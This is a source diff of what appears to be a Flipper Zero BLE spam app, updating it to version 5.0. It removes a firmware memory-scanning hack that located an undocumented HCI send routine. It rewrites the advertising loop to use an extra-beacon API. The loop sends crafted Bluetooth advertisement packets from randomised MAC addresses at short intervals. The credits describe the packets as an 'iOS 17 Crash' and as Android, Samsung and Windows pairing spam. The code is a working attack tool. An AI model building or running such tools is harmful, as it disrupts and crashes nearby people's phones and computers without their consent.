@@ -1,8 +1,9 @@
 #include "ble_spam.h"
 #include <gui/gui.h>
-#include <gui/elements.h>
 #include <furi_hal_bt.h>
-#include <stdint.h>
+#include <extra_beacon.h>
+#include <gui/elements.h>
+
 #include "protocols/_protocols.h"
 
 // Hacked together by @Willy-JL
@@ -10,184 +11,6 @@
 // iOS 17 Crash by @ECTO-1A
 // Android, Samsung and Windows Pairs by @Spooks4576 and @ECTO-1A
 // Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
-
-// NAPI FUNCTIONS BY NO PROTO FOR OFW API COMPATIBILITY
-// TODO: Use __attribute__((aligned(2))) instead?
-// TODO: Use an offset of the base address?
-
-#define TAG "FuriHalBt"
-#define BLE_STATUS_TIMEOUT 0xFFU
-#define BLE_CMD_MAX_PARAM_LEN 255
-
-typedef uint8_t tBleStatus;
-
-typedef __PACKED_STRUCT {
-    uint8_t Adv_Data_Length;
-    uint8_t Adv_Data[BLE_CMD_MAX_PARAM_LEN - 1];
-}
-aci_gap_additional_beacon_set_data_cp0;
-
-typedef __PACKED_STRUCT {
-    uint16_t Adv_Interval_Min;
-    uint16_t Adv_Interval_Max;
-    uint8_t Adv_Channel_Map;
-    uint8_t Own_Address_Type;
-    uint8_t Own_Address[6];
-    uint8_t PA_Level;
-}
-aci_gap_additional_beacon_start_cp0;
-
-struct hci_request {
-    uint16_t ogf;
-    uint16_t ocf;
-    int event;
-    void* cparam;
-    int clen;
-    void* rparam;
-    int rlen;
-};
-
-#define HCI_SEND_REQ_ADDR 0x080161e8
-#define TARGET_SEQUENCE 0x33680446
-#define SEQUENCE_OFFSET 6
-#define START_ADDR 0x8000140
-#define END_ADDR 0x80800ec
-
-uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
-    uint8_t* addr;
-    uint8_t* target_bytes = (uint8_t*)&sequence;
-
-    for(addr = (uint8_t*)START_ADDR; addr < (uint8_t*)END_ADDR - 3; addr++) {
-        if(addr[0] == target_bytes[3] && addr[1] == target_bytes[2] &&
-           addr[2] == target_bytes[1] && addr[3] == target_bytes[0]) {
-            return (uintptr_t*)(addr - SEQUENCE_OFFSET);
-        }
-    }
-    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to 0.90.1 OFW offset
-}
-
-int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;
-
-void* Osal_MemCpy(void* dest, const void* src, unsigned int size) {
-    return memcpy(dest, src, size);
-}
-
-void* Osal_MemSet(void* ptr, int value, unsigned int size) {
-    return memset(ptr, value, size);
-}
-
-tBleStatus aci_gap_additional_beacon_start(
-    uint16_t Adv_Interval_Min,
-    uint16_t Adv_Interval_Max,
-    uint8_t Adv_Channel_Map,
-    uint8_t Own_Address_Type,
-    const uint8_t* Own_Address,
-    uint8_t PA_Level) {
-    struct hci_request rq;
-    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
-    aci_gap_additional_beacon_start_cp0* cp0 = (aci_gap_additional_beacon_start_cp0*)(cmd_buffer);
-    tBleStatus status = 0;
-    int index_input = 0;
-    cp0->Adv_Interval_Min = Adv_Interval_Min;
-    index_input += 2;
-    cp0->Adv_Interval_Max = Adv_Interval_Max;
-    index_input += 2;
-    cp0->Adv_Channel_Map = Adv_Channel_Map;
-    index_input += 1;
-    cp0->Own_Address_Type = Own_Address_Type;
-    index_input += 1;
-    Osal_MemCpy((void*)&cp0->Own_Address, (const void*)Own_Address, 6);
-    index_input += 6;
-    cp0->PA_Level = PA_Level;
-    index_input += 1;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b0;
-    rq.cparam = cmd_buffer;
-    rq.clen = index_input;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-tBleStatus aci_gap_additional_beacon_stop(void) {
-    struct hci_request rq;
-    tBleStatus status = 0;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b1;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-tBleStatus aci_gap_additional_beacon_set_data(uint8_t Adv_Data_Length, const uint8_t* Adv_Data) {
-    struct hci_request rq;
-    uint8_t cmd_buffer[BLE_CMD_MAX_PARAM_LEN];
-    aci_gap_additional_beacon_set_data_cp0* cp0 =
-        (aci_gap_additional_beacon_set_data_cp0*)(cmd_buffer);
-    tBleStatus status = 0;
-    int index_input = 0;
-    cp0->Adv_Data_Length = Adv_Data_Length;
-    index_input += 1;
-    Osal_MemCpy((void*)&cp0->Adv_Data, (const void*)Adv_Data, Adv_Data_Length);
-    index_input += Adv_Data_Length;
-    Osal_MemSet(&rq, 0, sizeof(rq));
-    rq.ogf = 0x3f;
-    rq.ocf = 0x0b2;
-    rq.cparam = cmd_buffer;
-    rq.clen = index_input;
-    rq.rparam = &status;
-    rq.rlen = 1;
-    if(napi_hci_send_req(&rq, 0) < 0) return BLE_STATUS_TIMEOUT;
-    return status;
-}
-
-bool napi_furi_hal_bt_custom_adv_set(const uint8_t* adv_data, size_t adv_len) {
-    tBleStatus status = aci_gap_additional_beacon_set_data(adv_len, adv_data);
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_set failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_set success");
-        return true;
-    }
-}
-
-bool napi_furi_hal_bt_custom_adv_start(
-    uint16_t min_interval,
-    uint16_t max_interval,
-    uint8_t mac_type,
-    const uint8_t mac_addr[GAP_MAC_ADDR_SIZE],
-    uint8_t power_amp_level) {
-    tBleStatus status = aci_gap_additional_beacon_start(
-        (double)(min_interval / 0.625), // Millis to gap time
-        (double)(max_interval / 0.625), // Millis to gap time
-        0b00000111, // All 3 channels
-        mac_type,
-        mac_addr,
-        power_amp_level);
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_start failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_start success");
-        return true;
-    }
-}
-
-bool napi_furi_hal_bt_custom_adv_stop() {
-    tBleStatus status = aci_gap_additional_beacon_stop();
-    if(status) {
-        FURI_LOG_E(TAG, "custom_adv_stop failed %d", status);
-        return false;
-    } else {
-        FURI_LOG_D(TAG, "custom_adv_stop success");
-        return true;
-    }
-}
 
 static Attack attacks[] = {
     {
@@ -315,7 +138,7 @@ static Attack attacks[] = {
 
 #define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
 
-static uint16_t delays[] = {20, 50, 100, 200};
+static uint16_t delays[] = {20, 50, 100, 200, 500};
 
 typedef struct {
     Ctx ctx;
@@ -324,10 +147,10 @@ typedef struct {
     uint8_t lock_count;
     FuriTimer* lock_timer;
 
-    bool resume;
+    // bool resume;
     bool advertising;
     uint8_t delay;
-    uint8_t mac[GAP_MAC_ADDR_SIZE];
+    GapExtraBeaconConfig config;
     FuriThread* thread;
     int8_t index;
     bool ignore_bruteforce;
@@ -367,9 +190,10 @@ static int32_t adv_thread(void* _ctx) {
     uint8_t size;
     uint16_t delay;
     uint8_t* packet;
+    GapExtraBeaconConfig* config = &state->config;
     Payload* payload = &attacks[state->index].payload;
     const Protocol* protocol = attacks[state->index].protocol;
-    if(!payload->random_mac) furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
+    if(!payload->random_mac) furi_hal_random_fill_buf(config->address, sizeof(config->address));
     if(state->ctx.led_indicator) start_blink(state);
 
     while(state->advertising) {
@@ -383,14 +207,17 @@ static int32_t adv_thread(void* _ctx) {
         } else {
             protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
         }
-        napi_furi_hal_bt_custom_adv_set(packet, size);
+
+        delay = delays[state->delay];
+        config->min_adv_interval_ms = config->max_adv_interval_ms = delay;
+        if(payload->random_mac) furi_hal_random_fill_buf(config->address, sizeof(config->address));
+        furi_check(furi_hal_bt_extra_beacon_set_config(config));
+        furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
         free(packet);
 
-        if(payload->random_mac) furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
-        delay = delays[state->delay];
-        napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, state->mac, 0x1F);
+        furi_check(furi_hal_bt_extra_beacon_start());
         furi_thread_flags_wait(true, FuriFlagWaitAny, delay);
-        napi_furi_hal_bt_custom_adv_stop();
+        furi_hal_bt_extra_beacon_stop();
     }
 
     if(state->ctx.led_indicator) stop_blink(state);
@@ -402,11 +229,11 @@ static void toggle_adv(State* state) {
         state->advertising = false;
         furi_thread_flags_set(furi_thread_get_id(state->thread), true);
         furi_thread_join(state->thread);
-        if(state->resume) furi_hal_bt_start_advertising();
+        // if(state->resume) furi_hal_bt_start_advertising();
     } else {
         state->advertising = true;
-        state->resume = furi_hal_bt_is_active();
-        furi_hal_bt_stop_advertising();
+        // state->resume = furi_hal_bt_is_active();
+        // furi_hal_bt_stop_advertising();
         furi_thread_start(state->thread);
     }
 }
@@ -552,7 +379,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             "App+Spam: \e#WillyJL\e#\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#4.4\e#",
+            "                                   Version \e#5.0\e#",
             false);
         break;
     default: {
@@ -711,29 +538,33 @@ static bool input_callback(InputEvent* input, void* _ctx) {
                 }
             } else {
                 if(!advertising) {
-                    bool resume = furi_hal_bt_is_active();
-                    furi_hal_bt_stop_advertising();
+                    // bool resume = furi_hal_bt_is_active();
+                    // furi_hal_bt_stop_advertising();
+                    GapExtraBeaconConfig* config = &state->config;
                     Payload* payload = &attacks[state->index].payload;
                     const Protocol* protocol = attacks[state->index].protocol;
 
                     uint8_t size;
                     uint8_t* packet;
                     protocol->make_packet(&size, &packet, payload);
-                    napi_furi_hal_bt_custom_adv_set(packet, size);
+
+                    uint16_t delay = delays[state->delay];
+                    config->min_adv_interval_ms = config->max_adv_interval_ms = delay;
+                    if(payload->random_mac || input->type == InputTypeLong)
+                        furi_hal_random_fill_buf(config->address, sizeof(config->address));
+                    furi_check(furi_hal_bt_extra_beacon_set_config(config));
+                    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
                     free(packet);
 
-                    if(payload->random_mac || input->type == InputTypeLong)
-                        furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
-                    uint16_t delay = delays[state->delay];
-                    napi_furi_hal_bt_custom_adv_start(delay, delay, 0x00, state->mac, 0x1F);
+                    furi_check(furi_hal_bt_extra_beacon_start());
                     if(state->ctx.led_indicator)
                         notification_message(state->ctx.notification, &solid_message);
                     furi_delay_ms(10);
-                    napi_furi_hal_bt_custom_adv_stop();
+                    furi_hal_bt_extra_beacon_stop();
 
                     if(state->ctx.led_indicator)
                         notification_message_block(state->ctx.notification, &sequence_reset_rgb);
-                    if(resume) furi_hal_bt_start_advertising();
+                    // if(resume) furi_hal_bt_start_advertising();
                 }
             }
             break;
@@ -794,12 +625,13 @@ static bool back_event_callback(void* _ctx) {
 int32_t ble_spam(void* p) {
     UNUSED(p);
     State* state = malloc(sizeof(State));
+    state->config.adv_channel_map = GapAdvChannelMapAll;
+    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
+    state->config.address_type = GapAddressTypePublic;
     state->thread = furi_thread_alloc();
     furi_thread_set_callback(state->thread, adv_thread);
     furi_thread_set_context(state->thread, state);
     furi_thread_set_stack_size(state->thread, 2048);
-    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
-        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
     state->ctx.led_indicator = true;
     state->lock_timer = furi_timer_alloc(lock_timer_callback, FuriTimerTypeOnce, state);
 
